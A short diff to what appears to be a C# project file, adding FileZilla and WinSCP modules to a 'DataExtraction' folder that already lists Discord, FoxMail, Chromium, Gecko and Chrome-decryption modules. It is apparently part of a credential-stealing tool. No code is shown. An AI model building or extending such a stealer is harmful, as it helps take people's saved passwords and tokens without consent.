@@ -67,7 +67,9 @@
   <ItemGroup>
     <Compile Include="AesGcm\AesGcm.cs" />
     <Compile Include="DataExtraction\Applications\Discord.cs" />
+    <Compile Include="DataExtraction\Applications\FileZilla.cs" />
     <Compile Include="DataExtraction\Applications\FoxMail.cs" />
+    <Compile Include="DataExtraction\Applications\WinScp.cs" />
     <Compile Include="DataExtraction\Browsers\Chromium.cs" />
     <Compile Include="DataExtraction\Browsers\Gecko.cs" />
     <Compile Include="DataExtraction\Decryption\ChromeDecryptor.cs" />
